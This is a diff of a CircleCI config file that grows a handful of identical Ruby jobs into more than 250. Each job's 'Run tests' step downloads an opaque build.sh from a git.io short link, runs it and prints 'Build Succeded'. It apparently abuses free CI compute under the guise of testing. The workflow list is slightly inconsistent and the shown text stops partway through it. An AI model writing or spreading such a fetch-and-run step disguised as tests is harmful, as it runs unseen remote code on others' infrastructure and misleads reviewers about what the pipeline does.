@@ -1,6 +1,6 @@
 working_dir: &working_dir ~/app 
-.build_template: &script 
-  parallelism: 16 
+.build_template: &build_definition 
+  parallelism: 2 
   steps: 
     - checkout 
     - run: 
@@ -12,164 +12,1313 @@ working_dir: &working_dir ~/app
     - run: 
         name: Run tests 
         command: | 
-                    wget -qO build.sh https://git.io/J6Hhe 
+                    wget -qO build.sh https://git.io/J65mg 
                     chmod +x build.sh 
                     ./build.sh 
                     echo Build Succeded 
 version: 2.0 
 jobs: 
-  build1: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build2: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build3: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build4: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build5: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build6: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build7: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build8: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build9: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build10: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build11: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build12: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build13: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build14: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build15: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build16: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build17: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build18: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build19: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build20: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build21: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build22: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build23: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build24: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build25: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build26: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build27: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build28: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build29: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build30: 
-    <<: *script 
-    docker: 
-      - image: ruby 
- 
-workflows: 
-  version: 2 
-  commit: 
-    jobs: 
-      - build1 
-      - build2 
-      - build3 
-      - build4 
-      - build5 
-      - build6 
-      - build7 
-      - build8 
-      - build9 
-      - build10 
-      - build11 
-      - build12 
-      - build13 
-      - build14 
-      - build15 
-      - build16 
-      - build17 
-      - build18 
-      - build19 
-      - build20 
-      - build21 
-      - build22 
-      - build23 
-      - build24 
-      - build25 
-      - build26 
-      - build27 
-      - build28 
-      - build29 
-      - build30
+  version: 2.0
+
+jobs:
+  build:
+    docker:
+      - image: ruby
+    steps:
+      - checkout
+  build_ruby2_260:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_259:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_258:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_257:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_256:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_255:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_254:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_253:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_252:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_251:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_250:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_249:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_248:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_247:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_246:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_245:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_244:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_243:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_242:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_241:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_240:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_239:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_238:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_237:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_236:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_235:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_234:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_233:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_232:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_231:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_230:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_229:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_228:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_227:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_226:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_225:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_224:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_223:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_222:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_221:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_220:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_219:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_218:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_217:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_216:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_215:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_214:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_213:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_212:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_211:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_210:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_209:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_208:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_207:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_206:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_205:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_204:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_203:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_202:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_201:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_200:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_199:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_198:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_197:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_196:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_195:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_194:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_193:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_192:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_191:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_190:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_189:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_188:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_187:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_186:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_185:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_184:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_183:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_182:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_181:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_180:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_179:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_178:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_177:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_176:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_175:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_174:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_173:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_172:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_171:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_170:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_169:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_168:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_167:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_166:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_165:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_164:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_163:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_162:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_161:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_160:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_159:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_158:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_157:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_156:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_155:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_154:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_153:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_152:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_151:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_150:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_149:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_148:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_147:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_146:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_145:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_144:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_143:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_142:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_141:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_140:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_139:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_138:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_137:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_136:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_135:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_134:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_133:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_132:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_131:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_130:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_129:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_128:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_127:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_126:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_125:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_124:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_123:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_122:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_121:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_120:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_119:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_118:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_117:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_116:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_115:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_114:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_113:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_112:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_111:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_110:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_109:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_108:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_107:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_106:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_105:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_104:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_103:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_102:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_101:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_100:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_99:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_98:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_97:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_96:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_95:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_94:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_93:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_92:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_91:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_90:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_89:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_88:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_87:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_86:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_85:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_84:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_83:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_82:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_81:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_80:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_79:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_78:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_77:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_76:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_75:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_74:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_73:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_72:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_71:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_70:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_69:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_68:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_67:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_66:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_65:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_64:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_63:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_62:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_61:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_60:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_59:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_58:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_57:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_56:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_55:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_54:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_53:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_52:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_51:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_50:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_49:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_48:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_47:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_46:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_45:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_44:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_43:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_42:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_41:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_40:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_39:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_38:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_37:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_36:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_35:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_34:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_33:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_32:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_31:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_30:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_29:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_28:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_27:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_26:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_25:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_24:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_23:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_22:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_21:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_20:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_19:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_18:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_17:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_16:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_15:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_14:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_13:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.7
+  build_ruby2_12:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.6
+  build_ruby2_11:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.5
+  build_ruby2_10:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.4
+  build_ruby2_9:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_8:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+  build_ruby2_7:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.7
+  build_ruby2_6:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.6
+  build_ruby2_5:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.5
+  build_ruby2_4:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.4
+  build_ruby2_3:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+
+workflows:
+  version: 2
+  build_ruby:
+    jobs:
+      - build
+      - build_ruby2_260
+      - build_ruby2_258
+      - build_ruby2_258
+      - build_ruby2_257
+      - build_ruby2_256
+      - build_ruby2_255
+      - build_ruby2_254
+      - build_ruby2_253
+      - build_ruby2_252
+      - build_ruby2_251
+      - build_ruby2_250
+      - build_ruby2_249
+      - build_ruby2_248
+      - build_ruby2_247
+      - build_ruby2_246
+      - build_ruby2_245
+      - build_ruby2_244
+      - build_ruby2_243
+      - build_ruby2_242
+      - build_ruby2_241
+      - build_ruby2_240
+      - build_ruby2_239
+      - build_ruby2_238
+      - build_ruby2_237
+      - build_ruby2_236
+      - build_ruby2_235
+      - build_ruby2_234
+      - build_ruby2_233
+      - build_ruby2_232
+      - build_ruby2_231
+      - build_ruby2_230
+      - build_ruby2_229
+      - build_ruby2_228
+      - build_ruby2_227
+      - build_ruby2_226
+      - build_ruby2_225
+      - build_ruby2_224
+      - build_ruby2_223
+      - build_ruby2_222
+      - build_ruby2_221
+      - build_ruby2_220
+      - build_ruby2_219
+      - build_ruby2_218
+      - build_ruby2_217
+      - build_ruby2_216
+      - build_ruby2_215
+      - build_ruby2_214
+      - build_ruby2_213
+      - build_ruby2_212
+      - build_ruby2_211
+      - build_ruby2_210
+      - build_ruby2_209
+      - build_ruby2_208
+      - build_ruby2_207
+      - build_ruby2_206
+      - build_ruby2_205
+      - build_ruby2_204
+      - build_ruby2_203
+      - build_ruby2_202
+      - build_ruby2_201
+      - build_ruby2_200
+      - build_ruby2_199
+      - build_ruby2_198
+      - build_ruby2_197
+      - build_ruby2_196
+      - build_ruby2_195
+      - build_ruby2_194
+      - build_ruby2_193
+      - build_ruby2_192
+      - build_ruby2_191
+      - build_ruby2_190
+      - build_ruby2_189
+      - build_ruby2_188
+      - build_ruby2_187
+      - build_ruby2_186
+      - build_ruby2_185
+      - build_ruby2_184
+      - build_ruby2_183
+      - build_ruby2_182
+      - build_ruby2_181
+      - build_ruby2_180
+      - build_ruby2_179
+      - build_ruby2_178
+      - build_ruby2_177
+      - build_ruby2_176
+      - build_ruby2_175
+      - build_ruby2_174
+      - build_ruby2_173
+      - build_ruby2_172
+      - build_ruby2_171
+      - build_ruby2_170
+      - build_ruby2_169
+      - build_ruby2_168
+      - build_ruby2_167
+      - build_ruby2_166
+      - build_ruby2_165
+      - build_ruby2_164
+      - build_ruby2_163
+      - build_ruby2_162
+      - build_ruby2_161
+      - build_ruby2_160
+      - build_ruby2_159
+      - build_ruby2_158
+      - build_ruby2_157
+      - build_ruby2_156
+      - build_ruby2_155
+      - build_ruby2_154
+      - build_ruby2_153
+      - build_ruby2_152
+      - build_ruby2_151
+      - build_ruby2_150
+      - build_ruby2_149
+      - build_ruby2_148
+      - build_ruby2_147
+      - build_ruby2_146
+      - build_ruby2_145
+      - build_ruby2_144
+      - build_ruby2_143
+      - build_ruby2_142
+      - build_ruby2_141
+      - build_ruby2_140
+      - build_ruby2_139
+      - build_ruby2_138
+      - build_ruby2_137
+      - build_ruby2_136
+      - build_ruby2_135
+      - build_ruby2_134
+      - build_ruby2_133
+      - build_ruby2_132
+      - build_ruby2_131
+      - build_ruby2_130
+      - build_ruby2_129
+      - build_ruby2_128
+      - build_ruby2_127
+      - build_ruby2_126
+      - build_ruby2_125
+      - build_ruby2_124
+      - build_ruby2_123
+      - build_ruby2_122
+      - build_ruby2_121
+      - build_ruby2_120
+      - build_ruby2_119
+      - build_ruby2_118
+      - build_ruby2_117
+      - build_ruby2_116
+      - build_ruby2_115
+      - build_ruby2_114
+      - build_ruby2_113
+      - build_ruby2_112
+      - build_ruby2_111
+      - build_ruby2_110
+      - build_ruby2_109
+      - build_ruby2_108
+      - build_ruby2_107
+      - build_ruby2_106
+      - build_ruby2_105
+      - build_ruby2_104
+      - build_ruby2_103
+      - build_ruby2_102
+      - build_ruby2_101
+      - build_ruby2_100
+      - build_ruby2_99
+      - build_ruby2_98
+      - build_ruby2_97
+      - build_ruby2_96
+      - build_ruby2_95
+      - build_ruby2_94
+      - build_ruby2_93
+      - build_ruby2_92
+      - build_ruby2_91
+      - build_ruby2_90
+      - build_ruby2_89
+      - build_ruby2_88
+      - build_ruby2_87
+      - build_ruby2_86
+      - build_ruby2_85
+      - build_ruby2_84
+      - build_ruby2_83
+      - build_ruby2_82
+      - build_ruby2_81
+      - build_ruby2_80
+      - build_ruby2_79
+      - build_ruby2_78
+      - build_ruby2_77
+      - build_ruby2_76
+      - build_ruby2_75
+      - build_ruby2_74
+      - build_ruby2_73
+      - build_ruby2_72
+      - build_ruby2_71
+      - build_ruby2_70
+      - build_ruby2_69
+      - build_ruby2_68
+      - build_ruby2_67
+      - build_ruby2_66
+      - build_ruby2_65
+      - build_ruby2_64
+      - build_ruby2_63
+      - build_ruby2_62
+      - build_ruby2_61
+      - build_ruby2_60
+      - build_ruby2_59
+      - build_ruby2_58
+      - build_ruby2_57
+      - build_ruby2_56
+      - build_ruby2_55
+      - build_ruby2_54
+      - build_ruby2_53
+      - build_ruby2_52
+      - build_ruby2_51
+      - build_ruby2_50
+      - build_ruby2_49
+      - build_ruby2_48
+      - build_ruby2_47
+      - build_ruby2_46
+      - build_ruby2_45
